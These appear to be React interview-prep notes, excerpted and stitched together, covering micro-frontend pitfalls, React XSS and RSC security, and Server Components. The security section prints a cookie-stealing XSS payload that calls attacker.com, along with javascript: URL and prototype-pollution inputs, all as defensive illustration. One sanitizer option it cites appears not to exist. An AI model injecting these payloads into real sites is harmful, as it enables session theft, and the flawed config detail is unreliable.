the architecture that was supposed to enable independence now has tight
coupling. Root cause: shared state was not addressed in the architecture
design. Fix: define clear contracts for cross-MFE communication: use
browser custom events for loose coupling, a shared event bus, or
shared storage (localStorage/sessionStorage with defined schemas).
For authentication specifically: use cookies (automatically shared
across subdomains) or a centralized auth service. Accept that some
sharing is necessary and design explicitly for it.

**Failure Mode 2: Performance degradation from loading React
multiple times in a micro-frontend composition.**

Symptom: initial page load is slow (3-5 seconds); network tab shows
multiple large React/ReactDOM bundles loaded. Root cause: each
micro-frontend bundles its own copy of React without sharing.
Diagnosis: network tab shows react.production.min.js loaded 3-4
times; total JS payload is much larger than a monolith would be.
Fix: use Module Federation to mark React/ReactDOM as `shared`
singletons; configure the host app to be the authoritative provider;
set `singleton: true` and `requiredVersion` to enforce version
compatibility. Monitor bundle sizes in CI to catch regressions.

**Failure Mode 3: CSS isolation failure causes style bleed
between micro-frontends.**

Symptom: styles from one micro-frontend override styles in another;
adding a new micro-frontend breaks the visual appearance of existing
ones. Root cause: global CSS (from `index.css`, third-party library
styles, or non-scoped component styles) is not namespaced to the
owning micro-frontend. Fix: enforce CSS isolation using one of:
CSS Modules (scopes selectors to a hash), Shadow DOM (complete
style isolation), or CSS-in-JS libraries (Styled Components, Emotion)
with unique prefixes. Ensure that third-party CSS is wrapped and
scoped. Add visual regression tests (Chromatic, Percy) to catch
style bleed in CI.
...
| Scenario | Time | Key Signal |
|---|---------|-----------|
| Feature-based structure | 3-4 min | Colocation vs layers |
| Context re-render problem | 4-5 min | Subscription model fix |
| Zustand vs Context at scale | 3-4 min | Re-render granularity |
| When to use micro-frontends | 4-5 min | Org problem, not tech |
| Module Federation | 5-6 min | Runtime sharing |
| Shared dependencies | 3-4 min | One React, multiple MFEs |
| Cross-MFE communication | 4-5 min | Events, URL, shared store |
| MFE debugging | 4-5 min | Cross-app tracing |
| Monorepo strategy | 3-4 min | pnpm/nx workspaces |
| Design a scalable React app | 10-12 min | Phase-by-phase |
| Feature flags at scale | 3-4 min | LaunchDarkly, local flags |
| Bundle budget at scale | 3-4 min | Size limits in CI |

---

**[JUNIOR] Q1 - [MECHANISM] A team is proposing micro-frontends for their 15-engineer React app.**
How do you evaluate the decision?** `[STAFF]` DECISION

> **Answer:**
>
> Micro-frontends solve an organizational problem - not a technical one.
> The evaluation:
>
> **Questions to ask:**
>
> 1. Do different teams need to deploy to production independently
>    without coordinating with each other? If no, MFE buys little.
>
> 2. Are teams literally blocked from releasing because another team's
>    feature isn't ready? (Release train problem)
>
> 3. Does each area need a fundamentally different tech stack?
>    (React 18 for one team, different framework for another)
>
> 4. Is the team size genuinely at MFE threshold? (Typically 30-50+
>    engineers working on the same deployment)
>
> **At 15 engineers, the answer is almost always NO to MFE.**
>
> **What they probably need instead:**
>
> - Monorepo with feature-based structure (team owns a feature folder)
> - `packages/` with shared component library
> - Feature flags for independent release (deploy code hidden behind flag,
>   release when ready without deployment coordination)
> - Clear team ownership of feature domains
>
> **Cost of premature MFE (15 engineers):**
> - All teams now manage separate CI/CD pipelines
> - Shared dependency version negotiation (React upgrades require
>   all teams to upgrade simultaneously or maintain compatibility)
> - Cross-app debugging is significantly harder
> - Performance: additional network requests for remote entry files
>
> > *What separates good from great:* Naming feature flags as the
> > specific alternative to MFE. Feature flags provide deployment
> > independence (team A deploys on Monday behind a flag, enables
> > it Thursday after QA) without the infrastructure cost of MFE.
> > Most "we need MFE" problems are solved by "we need feature flags
> > and team ownership conventions."
...
🎯 **Interview Weight:** expert (★★★) - security is asked at senior level;
XSS in React, dangerouslySetInnerHTML, and RSC injection are key topics
...
> React's JSX auto-escapes text content, preventing most XSS attacks.
> The danger zones: `dangerouslySetInnerHTML` (bypasses escaping),
> `javascript:` URLs in `href`/`src`, `eval()` with user data,
> and in Server Components - directly embedding unsanitized user data
> in HTML strings. Mitigations: never use `dangerouslySetInnerHTML`
> with user input; validate URLs before setting `href`; use DOMPurify
> for cases where HTML rendering is genuinely required.

**3 minutes:**

> React's auto-escaping converts `<script>alert('xss')</script>` to
> `&lt;script&gt;...&lt;/script&gt;` when rendered as text. This is
> automatic and reliable for JSX text content.
> Vulnerabilities: (1) `dangerouslySetInnerHTML={{ __html: userInput }}`
> - directly inserts HTML, React does NOT escape it. (2) `href={userUrl}`
> where `userUrl = "javascript:alert(1)"` - React renders the link;
> clicking executes script. (3) Prototype pollution via props. (4) RSC:
> passing secrets in props that get serialized to the client.
> In Next.js App Router: never put API keys, PII, or secrets in data
> passed from Server Components to Client Components as props - they
> appear in the RSC payload (visible in network tab).

**Blank Mind Recovery:**

**(1) Restate:** "React auto-escapes text - safe. Dangers: dangerouslySetInnerHTML
with user input (XSS), javascript: URLs in href, eval() with user data.
Mitigations: DOMPurify for HTML, validate URLs, never eval user input.
RSC: secrets in props are serialized to client - don't do it."
...
React's security model is largely automatic for text rendering but has
specific vulnerabilities when developers bypass the safety mechanisms
or make architectural errors with server/client boundaries.
...
function Comment({ text }) {
  ...
  // React renders: &lt;script&gt;alert('xss')&lt;/script&gt; (safe)
  return <p>{text}</p>;
}

// VULNERABILITY 1: dangerouslySetInnerHTML
function CommentBad({ html }) {
  // DANGER: If html comes from user input, this is XSS
  // No escaping occurs - raw HTML is inserted
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// MITIGATION: Sanitize with DOMPurify before using
import DOMPurify from 'dompurify';

function CommentSafe({ html }) {
...
// VULNERABILITY 2: javascript: URLs
function LinkBad({ url }) {
  // User provides: "javascript:document.cookie"
  // React renders the anchor - clicking runs the script!
  return <a href={url}>Click me</a>;
}

// MITIGATION: validate URL scheme before rendering
function LinkSafe({ url }) {
  ...
  return <a href={url} rel="noopener noreferrer">Click me</a>;
}

// VULNERABILITY 3: RSC secrets leaking to client
// BAD: API key in Server Component passed to Client Component
async function ServerComponent() {
  const apiKey = process.env.THIRD_PARTY_API_KEY; // secret
  const data = await fetchWithKey(apiKey);

  return (
    // PROBLEM: apiKey is in props -> appears in RSC payload!
    // Visible in browser network tab
    <ClientComponent data={data} apiKey={apiKey} />
  );
}

// GOOD: never pass secrets as props; pass only the result
async function ServerComponent() {
  const data = await fetchWithKey(process.env.THIRD_PARTY_API_KEY);
  // Only the data reaches the client, not the key
  return <ClientComponent data={data} />;
}

// VULNERABILITY 4: eval() or Function() with user data
// Never do this:
function BadEval({ formula }) {
  // XSS via prototype pollution + arbitrary code execution
  const result = eval(formula);
  return <span>{result}</span>;
}
// Use a safe expression parser instead (mathjs, expr-eval)

// VULNERABILITY 5: prototype pollution via spread props
function BadComponent(userProps) {
  // If userProps = { __proto__: { admin: true } }
  // spreading can pollute prototype in some environments
...
React's auto-escaping protects against the most common XSS attacks but
developers can bypass protections by misusing `dangerouslySetInnerHTML`
or `javascript:` URLs. RSC introduces a new category: secrets in the
component tree becoming visible in the network payload.
...
```jsx
// FAILURE EXAMPLE: Content Security Policy bypass via React

// A React app with an inline React render (Webpack HMR, etc.)
// is commonly exploited by injecting into a script tag
// This is mitigated by a strict Content-Security-Policy header

// MITIGATION: Set CSP headers in your server/Next.js config
...
// ALSO: rel="noopener noreferrer" on ALL external links
// Prevents new tab from accessing opener window
...
> defeats the purpose. In Next.js, the middleware generates the nonce,
> sets the CSP header, and the nonce is passed to inline scripts.
> The `rel="noopener noreferrer"` on external links prevents the
> opened tab from accessing `window.opener` (tab-napping attack).
...
> React automatically escapes text content in JSX, preventing most XSS
> attacks. The main danger is `dangerouslySetInnerHTML` - using it with
> user input enables XSS. Always sanitize with DOMPurify if you need to
> render HTML. Also validate URLs before using them in `href` to prevent
> `javascript:` protocol attacks.

**Senior / Staff:**

> React's security model is "safe by default for JSX text, dangerous by
> exception." The three places security breaks down: (1) explicit HTML
> rendering via `dangerouslySetInnerHTML` - mitigate with DOMPurify with
> a strict allowlist of tags/attributes; (2) unvalidated URLs - mitigate
> with URL protocol validation before rendering links; (3) RSC boundary
> leaks - Server Component data passed to Client Component props appears
> in the RSC payload in the network. Architectural fix: Server Components
> should pass derived data, never secrets/keys.
>
> At the infrastructure level: Content Security Policy headers prevent
> injected scripts from executing even if XSS occurs. This is defense
> in depth. `rel="noopener noreferrer"` on external links prevents
> tab-napping. These are table stakes for production React apps.

---

### ⚖️ Comparison Table

| Attack vector | React default | Vulnerable pattern | Mitigation |
|---|---|---|---|
| XSS via text | Safe (auto-escaped) | `dangerouslySetInnerHTML` | DOMPurify sanitize |
| XSS via URL | Unsafe | `href={userInput}` | Validate protocol |
| Secret leak | Safe | `<Client secretKey={key}` | Pass only derived data |
| Tab-napping | Unsafe | `target="_blank"` | `rel="noopener noreferrer"` |
| Script injection | Unsafe | No CSP | CSP header with nonce |
...
1. INPUT VALIDATION (server)
   - Sanitize all user input at API boundary
   - Validate content type, length, allowed characters
   - Use a schema validator (Zod, Joi)

2. STORAGE
   - Store raw user content (not pre-rendered HTML)
   - Never store rendered HTML from user input

3. RENDERING
   - React JSX text: safe by default
   - Rich text (allowed HTML): DOMPurify with strict allowlist
     ALLOWED_TAGS: [b, i, em, strong, a, ul, ol, li]
     ALLOWED_ATTR: [href] with URL validation
   - Code blocks: display as text, not eval()
...
5. RSC BOUNDARY (Next.js)
   - Server Components fetch sensitive data
   - Pass only sanitized, minimal data as props
   - Never pass API keys, auth tokens, full user records

Monitoring:
   - Log CSP violations (report-uri directive)
   - Alert on dangerouslySetInnerHTML usage in code review
...
**Misconception 1: React automatically prevents all XSS attacks.**

React escapes JSX string expressions (`{userContent}`), preventing
most reflected XSS. But it does NOT protect against: (1)
`dangerouslySetInnerHTML` - explicitly bypasses escaping for raw HTML
injection, (2) `javascript:` URLs in `href` or `src` attributes:
`<a href={userUrl}>` where `userUrl = "javascript:alert(1)"` executes,
(3) SVG `<use>` elements referencing external resources, and (4) data
rendered as server-side HTML before React hydrates. The protection is
partial - developers must still validate and sanitize user-controlled
data that goes into these escape hatches.

**Misconception 2: Using environment variables in the frontend
keeps secrets secure.**

Environment variables prefixed with `REACT_APP_` (CRA) or `VITE_`
(Vite) are EMBEDDED in the client bundle at build time. They appear
in plain text in the compiled JavaScript, visible to any user who
opens DevTools or downloads the bundle. Only use frontend environment
variables for NON-SECRET configuration: public API URLs, feature flags,
public keys. Never use them for: API secrets, private keys, database
credentials, or any value that must not be visible to users. Secrets
belong on the server side only.

**Misconception 3: Content Security Policy (CSP) is only needed
for complex applications.**

CSP is one of the most effective XSS mitigations available and should
be applied to any React application that handles user data. Even if
React prevents direct JSX injection, a CSP header (`Content-Security-Policy:
script-src 'self'`) prevents injected scripts from executing and
prevents data exfiltration via unauthorized connections. Without CSP,
any XSS that does occur (through dangerouslySetInnerHTML, third-party
scripts, or hydration attacks) has full capability. CSP is a defense-in-depth
layer, not a substitute for input validation.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: XSS via dangerouslySetInnerHTML with
unsanitized user content.**

Symptom: a user submits HTML content (e.g. in a rich text editor,
comment with formatting), it is stored in the database, and rendered
via `dangerouslySetInnerHTML` - an attacker submits
`<img src=x onerror="document.location='https://attacker.com/steal?c='+document.cookie">`.
Diagnosis: test `dangerouslySetInnerHTML` usage with XSS payloads
including `<script>`, `<img onerror>`, `<svg onload>`. Fix: ALWAYS
sanitize HTML before setting it: use DOMPurify (`DOMPurify.sanitize(html)`)
which removes dangerous tags/attributes while preserving safe formatting.
Never render unsanitized user HTML.

**Failure Mode 2: Open redirect via user-controlled navigation
target.**

Symptom: an attacker constructs a URL like
`https://yourapp.com/redirect?to=https://attacker.com` and your app
navigates users there after login, enabling phishing. Root cause:
code like `navigate(searchParams.get('redirect'))` without
validating the destination. Fix: validate redirect targets against
an allowlist of known-safe paths or domains. For internal redirects,
ensure the target starts with `/` or is a known relative path -
never redirect to arbitrary user-supplied URLs.

**Failure Mode 3: JWT stored in localStorage is vulnerable to
XSS-based token theft.**

Symptom: an XSS vulnerability (even minor, like in a third-party
script) can read `localStorage` and exfiltrate the authentication
token, leading to account takeover. Root cause: `localStorage` is
accessible to all JavaScript on the page, including injected scripts.
Fix: store authentication tokens in HttpOnly cookies (not accessible
to JavaScript), which are sent automatically with requests and resist
XSS-based theft. The trade-off: cookies require CSRF protection
(`SameSite=Strict` or CSRF tokens). For SPAs with REST APIs, evaluate
whether HttpOnly cookies or a token-rotation strategy with short
`localStorage` token lifetime is more appropriate.
...
| Scenario | Time | Key Signal |
|---|---------|-----------|
| React XSS protection | 2-3 min | Auto-escaping in JSX |
| dangerouslySetInnerHTML risks | 3-4 min | No escaping + DOMPurify |
| javascript: URL attack | 3-4 min | Protocol validation |
| RSC secret leaking | 4-5 min | Props in network payload |
| CSP with React | 4-5 min | Nonce pattern |
| noopener noreferrer | 2-3 min | Tab-napping prevention |
| Secure design for UGC | 7-10 min | System design |
| eval() in React | 2-3 min | Always forbidden |
| Dependency vulnerabilities | 3-4 min | npm audit, Snyk |
| CORS and React SPAs | 3-4 min | API server config |
| JWT storage in React | 4-5 min | localStorage vs httpOnly |
| Code review: find XSS | 5-7 min | Pattern recognition |
...
> **Answer:**
>
> Rich text rendering requires HTML but must prevent XSS. The approach:
>
> ```jsx
> // Step 1: Define what's allowed (allowlist approach)
> import DOMPurify from 'dompurify';
>
> const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a',
>   'ul', 'ol', 'li', 'p', 'br', 'blockquote', 'code'];
...
>     ALLOWED_TAGS,
>     ALLOWED_ATTR,
>     // Prevent href="javascript:..."
>     FORCE_HTTPS: true,
>   });
> }
>
> // Step 2: Additional URL validation on links
> function addSafeUrlConfig() {
>   DOMPurify.addHook('afterSanitizeAttributes', (node) => {
>     if (node.tagName === 'A') {
>       node.setAttribute('target', '_blank');
>       node.setAttribute('rel', 'noopener noreferrer');
>       // Remove non-http(s) hrefs
...
>   const clean = sanitizeRichText(htmlContent);
>   return (
>     <div
>       className="rich-text"
...
>
> Architecture notes:
> - Sanitize on the CLIENT (DOMPurify runs in browser context, handles
>   browser-specific encoding). For SSR: sanitize on server too with
>   isomorphic-dompurify.
> - Store RAW user content in DB, sanitize on read/render (not on write).
>   This allows updating the allowlist without re-processing stored data.
> - Consider server-side sanitization as an additional layer for API
>   responses (defense in depth).
>
> *What separates good from great:* The DOMPurify hook to add
> `rel="noopener noreferrer"` to all links is a production detail most
> engineers miss. DOMPurify sanitizes structure and attributes but doesn't
> add defensive attributes. The hook pattern lets you post-process nodes
> after sanitization to add security attributes. Also: storing raw content
> and sanitizing on render is an architectural best practice - it means you
> can tighten or adjust the allowlist later by just clearing a cache, not
> re-migrating data.
...
**Misconception 1: React Server Components replace traditional
API endpoints and REST APIs.**

RSC renders components on the server and streams the result to the
client, but this is not the same as replacing your API layer. You
still need API endpoints for: mutations (form submissions, data
updates) which use Server Actions or traditional endpoints, client-only
data needs (real-time updates, WebSocket), and third-party client
integrations. RSC eliminates the need for a "BFF" (Backend for
Frontend) API that only exists to fetch data for rendering. The
pattern shifts from "component fetches API, API fetches database"
to "component IS the data access layer, running on the server."

**Misconception 2: All components should be Server Components
for best performance.**

Server Components are ideal for components that fetch data, access
backend resources (databases, file systems), or contain heavy
dependencies that should not be in the client bundle. But any
component that uses: event handlers (`onClick`, `onChange`), browser
APIs (`localStorage`, `window`), React state (`useState`, `useReducer`),
hooks that use these APIs, or effects (`useEffect`) MUST be a Client
Component. The correct architecture: default to Server Components
for data-fetching and rendering, add `"use client"` directive only
where client interactivity is needed.

**Misconception 3: Suspense boundaries are only for lazy-loaded
code.**

Suspense was originally introduced for `React.lazy` code splitting.
React 18 expanded Suspense to work with any async operation that
"suspends" - including RSC data fetching, `use(promise)` in client
components, and libraries that implement the Suspense protocol
(React Query with the `suspense: true` option). Suspense is now a
general async boundary: any component that throws a Promise will be
...
**Failure Mode 1: "You're importing a component that needs
useState" error in Server Component.**

Symptom: error at build/runtime: "You're importing a component that
needs useState. It only works in a Client Component but none of its
parents are marked with 'use client'." Root cause: a Server Component
imports a Client Component that calls hooks, but the Server Component
itself has no `'use client'` boundary above it. Fix: add `'use client'`
at the top of the component that uses hooks OR move the hooks to a
wrapper component and add `'use client'` to that wrapper while keeping
the parent as a Server Component. The boundary is additive - all
children of a Client Component also become client-rendered.

**Failure Mode 2: Suspense fallback flashes briefly even for fast
data fetches.**

Symptom: users see the spinner/skeleton for 50-100ms even when server
data loads quickly, causing a visual flash. Root cause: Suspense shows
the fallback immediately while waiting for the async data, even if
the data arrives in under a frame. Fix in React 18: this is addressed
by streaming SSR - the server waits a short period before sending
the fallback, allowing fast data to arrive and stream the complete
content in the first response. In frameworks like Next.js, use
`loading.tsx` files which are Suspense boundaries with stream-optimized
behavior. For client-side: consider using transitions to defer showing
the fallback for fast operations.

**Failure Mode 3: Server Component re-renders on every request
because data is not cached.**

Symptom: each page load triggers a database query even for
infrequently changing data. Root cause: in frameworks like Next.js,
`fetch()` in Server Components uses the Node.js runtime's native
fetch with caching disabled by default in App Router. Fix: use
`fetch(url, { next: { revalidate: 60 } })` to cache with time-based
revalidation; use `unstable_cache` for non-fetch data sources
(database queries, ORM calls); use `cache: 'force-cache'` for static
...
recursive call stack. Enables interruption. Two phases: reconciliation (pause-sa
...
getByText > getByTestId (priority order). userEvent not fireEvent. findBy/waitFo
